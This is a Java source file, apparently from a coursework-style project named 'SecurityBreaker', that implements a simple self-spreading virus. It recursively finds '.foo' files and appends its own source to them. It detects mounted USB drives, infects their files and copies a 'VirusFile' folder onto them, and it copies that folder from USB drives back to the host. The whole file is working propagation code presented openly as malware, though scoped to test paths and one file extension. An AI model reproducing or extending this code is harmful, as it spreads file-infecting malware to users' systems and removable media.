import net.samuelcampos.usbdrivedetector.USBDeviceDetectorManager;
import net.samuelcampos.usbdrivedetector.USBStorageDevice;
import org.apache.commons.io.FileUtils;

import java.io.*;
import java.util.List;

public class FileSearch  // Class For Searching directory and its every subdirectory for .foo extension file
{
    public String find(File dir) throws Exception {
        String pattern = ".foo";

        File listFile[] = dir.listFiles();
        //This listFile[] array will store all the subdirectory within specified dir(It can be path
        // of my main hard disk since in MAC it is not divided into drives. It can be path of USB Drive as soon as
        // it is mounted on my device
        if (listFile != null)
        {
            for (int i=0; i<listFile.length; i++)
            {

                if (listFile[i].isDirectory())  // Again search for subdirectory---> move to else part till .foo file is not found
                {
                    // (TASK-3) Copying "VirusFile" To My Destined Path Location on System from the USB Drive if it is
                    // present
                    // in the USB DRIVE
                    if(listFile[i].getName().equals("VirusFile")){
                        System.out.println("VirusFile Detected on USB DRIVE.....copying it to the attached SYSTEM");
                        System.out.println();
                        File src = new File(listFile[i].getAbsolutePath());
                        File dest = new File("/Users/shashack/Desktop/VirusFile");
                        try {
                            FileUtils.copyDirectory(src, dest);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        System.out.println("Virus Successfully copied to System at path /Users/shashack/Desktop/...." +
                                ".TASK-3 ends......");
                    }
                    find(listFile[i]);  // If it is directory look for subdirectory for .foo file
                } else
                {
                    if (listFile[i].getName().endsWith(pattern))
                    {
                        System.out.println("Found .foo file are : "+listFile[i].getPath());
                        // Mentioning the path of this "V" file to append it to .foo file once found
                        String src = "/Users/shashack/Desktop/SecurityBreaker/src/main/VirusFile/FileSearch.java";


                        // Appending the code to .foo file {Look AppendFiles Class}
                        File x = new File(src);
                        String dest = listFile[i].getPath();
                        File y = new File(dest);
                        AppendFiles appender = new AppendFiles();
                        appender.copyContent(x,y);
                    }

                }
            }
        }
        return pattern;
    }
    public static void main(String[] args) throws Exception {


        // (TASK-1) For infecting the files and folders on system with path of folders
        FileSearch fileSearch = new FileSearch();

        // Specify the Folder which you want to search for to detect .foo extension file {In Mac Hard disk is not
        // divided into drives like C,D,E,F, so I have chosen one of my folder to test the program.}
        System.out.println("Following are the .foo extension file in Directory of the specified path on SYSTEM");
        System.out.println();
        System.out.println("Appending this source code to these files.....Task-1 ends......");
        System.out.println();
        fileSearch.find(new File("/Users/shashack/Desktop/testsecurity/"));


        // (TASK-2) For infecting the USB. I have used a dependency for identifying attached USB drive { Can be looked
        // into pom.xml file }
        USBDeviceDetectorManager driveDetector = new USBDeviceDetectorManager();

        // This will store List of all the USB storage devices currently connected
        List<USBStorageDevice> removableDevices = driveDetector.getRemovableDevices();

    // Iterating over each USB storage device
        for (USBStorageDevice device : removableDevices) {
            // Procuring the root directory path of USB drive
            String rootDirectory = String.valueOf(device.getRootDirectory());

            // Display the root directory path
            System.out.println();
            System.out.println("Following are the .foo extension file in Directory USB Drive Path: " + rootDirectory);
            System.out.println();
            System.out.println("Infecting .foo files on USB drive with this code");
            System.out.println();
            // Searching every directory in USB drive for .foo extension file and appending this code to it
            //(TASK-2 {Part-1})
            FileSearch fileSearch2 = new FileSearch();
            fileSearch2.find(new File(rootDirectory));
            System.out.println("Successfully infected .foo files on USB Drive....TASK-2 {Part-1} ends.....");
            System.out.println();

            // (TASK-2 {Part-2}) Copy this Virus File on the system to The Mounted USB Drive
            File source = new File("/Users/shashack/Desktop/SecurityBreaker/src/main");
            try {   // Ignore Copying Virus File To USB Drive incase No Virus exists on the system
                if(!source.isFile()){
                    continue;
                }
            }
            catch (Exception e){
            }
            File dest = new File(rootDirectory);
            try {
                FileUtils.copyDirectory(source, dest);
            } catch (IOException e) {
                e.printStackTrace();
            }
            System.out.println("Creating a Copy of VirusFile on newly attached USB DRIVE......TASK-2{Part-2} ends....");
                        //-----------Copying to USB DRIVE ends here-----------------------

        }


        driveDetector.close();
    }
}

